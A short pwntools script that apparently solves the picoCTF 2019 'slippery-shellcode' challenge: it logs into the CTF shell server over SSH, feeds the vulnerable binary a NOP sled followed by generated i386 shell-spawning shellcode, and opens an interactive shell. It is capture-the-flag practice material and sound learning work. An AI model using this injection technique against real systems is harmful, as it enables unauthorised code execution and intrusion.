from pwn import *

binary = "./slippery"


#p = process(binary)
passwd = input().rstrip()
s = ssh(host="2019shell1.picoctf.com", user="tiki", password=passwd)
p = s.process(
    "/problems/slippery-shellcode_5_5cea4ae04c57923484bda350da9f4015/vuln")
p.sendlineafter(b":\n", b"\x90"*256+asm(shellcraft.i386.linux.sh()))

p.interactive()
